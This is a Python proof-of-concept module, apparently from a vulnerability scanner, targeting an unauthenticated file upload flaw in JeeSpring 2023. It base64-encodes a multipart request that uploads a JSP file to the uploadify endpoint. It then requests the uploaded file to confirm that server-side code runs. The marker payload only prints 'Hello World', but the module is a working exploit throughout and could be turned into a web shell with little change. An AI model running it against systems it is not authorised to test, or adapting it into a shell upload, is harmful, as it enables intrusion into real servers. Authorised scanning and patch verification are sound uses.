# coding:utf-8

import aiohttp
import base64
from util import RandomUA
from util.Translate import tr

class JeeSpring_2023_Async:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua = ua.UserAgent()
        self.headers1 = {
            'User-Agent': self.ua,
            'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
            'Connection': 'close'
        }
        self.payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
        self.payload = base64.b64decode(self.payload2)
        self.path = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'

    async def fetch(self, session, url, payload, headers, proxies):
        try:
            async with session.post(url=url, data=payload, headers=headers, verify_ssl=False, proxies=proxies) as response:
                return await response.text(), response.status
        except Exception as e:
            return str(e), 0

    async def poc(self, url, proxies, ProxyStute):
        if ProxyStute == 1:
            proxy = proxies
        else:
            proxy = None
        try:
            async with aiohttp.ClientSession() as session:
                text1, code1 = await self.fetch(session, url + self.path, self.payload, self.headers1, proxy)

                if 'jsp' in text1 and code1 == 200:
                    result1 = tr("v.jee.payload")
                    newpath = text1.strip()
                    urltest = url + "static/uploadify/" + newpath
                    text2, code2 = await self.fetch(session, urltest, b"", self.headers1, proxy)

                    if 'Hello' in text2 and code2 == 200:
                        result2 = tr("v.jee.found", url=urltest)
                        return result1 + result2
                    else:
                        result2 = tr("v.jee.manual", url=urltest)
                        return result1 + result2
                else:
                    result = tr("v.jee.none", url=url)
                    return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error
    async def exp(self, url, proxies, ProxyStute):
        pass